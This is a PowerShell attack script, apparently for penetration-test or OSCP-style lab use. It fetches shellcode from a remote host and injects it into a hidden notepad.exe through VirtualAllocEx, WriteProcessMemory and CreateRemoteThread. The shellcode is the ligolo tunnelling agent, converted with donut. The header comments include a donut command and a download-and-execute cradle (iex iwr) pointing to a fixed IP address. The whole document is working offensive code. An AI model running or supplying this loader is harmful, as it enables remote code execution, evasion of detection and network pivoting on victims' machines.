#1 Make sure to convert agent.exe of ligolo to shellcode: donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
#2 Make sure you are running as x64 bit process before running.
#4 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-Hollow.ps1 -UseBasicParsing)

# Step 1: Check if running as a 64-bit process
if ([System.IntPtr]::Size -ne 8) {
    # Check if the script is already running in 64-bit PowerShell
    if (-not $env:IS_64BIT) {
        Write-Host "32-bit PowerShell detected. please make sure to switch to 64 bit before running again. `nExecute: C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe`nAnd try again."
	exit
	}
}

# If we're in a 64-bit process, continue with the rest of the script
Write-Host "Running as a 64-bit process..."

# Step 2: Start notepad.exe in suspended mode
Write-Host "Starting notepad.exe in suspended mode..."
$notepadProcess = Start-Process -FilePath "C:\Windows\System32\notepad.exe" -WindowStyle Hidden -PassThru
$procid = $notepadProcess.Id
Write-Host "Started notepad.exe with PID: $procid"

# Step 3: Download the shellcode (agent.bin)
$url = "http://192.168.45.223/agent.bin"
Write-Host "Downloading shellcode from $url..."
try {
    $shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    Write-Host "Shellcode downloaded successfully, size: $($shellcode.Length) bytes."
} catch {
    Write-Error "Failed to download shellcode: $_"
    exit
}

# Step 4: Add required native methods
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@ -Language CSharp

# Step 5: Define constants
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

# Step 6: Open the target process (notepad.exe)
$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $procid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "Failed to open target process."
    exit
}

# Step 7: Allocate memory in the target process
Write-Host "Allocating memory in the target process..."
$size = $shellcode.Length
$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
if ($addr -eq [IntPtr]::Zero) {
    Write-Error "Memory allocation failed."
    [Kernel32]::CloseHandle($hProcess)
    exit
}

# Step 8: Write shellcode to the allocated memory
Write-Host "Writing shellcode to allocated memory..."
$out = 0
$result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$out)
if (-not $result) {
    Write-Error "Failed to write shellcode to the target process."
    [Kernel32]::CloseHandle($hProcess)
    exit
}

# Step 9: Create a remote thread to execute the shellcode
Write-Host "Creating remote thread to execute shellcode..."
$thread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) {
    Write-Error "Failed to create remote thread."
    [Kernel32]::CloseHandle($hProcess)
    exit
}

Write-Host "Shellcode injected and executed successfully."
[Kernel32]::CloseHandle($hProcess)
